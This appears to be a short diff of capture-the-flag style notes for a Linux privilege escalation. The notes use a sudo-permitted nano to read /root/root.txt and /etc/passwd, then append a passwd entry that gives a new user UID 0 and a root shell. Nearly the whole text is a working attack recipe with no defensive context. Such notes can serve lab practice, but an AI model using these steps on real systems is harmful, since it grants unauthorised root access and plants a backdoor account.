@@ -1,0 +1,5 @@
+sudo /bin/nano /opt/priv
+CTRL+R /root/root.txt
+CTRL+R /etc/passwd
+strangeplayer:1234:0:0:root:/root:/bin/bash
+CTRL+O = save
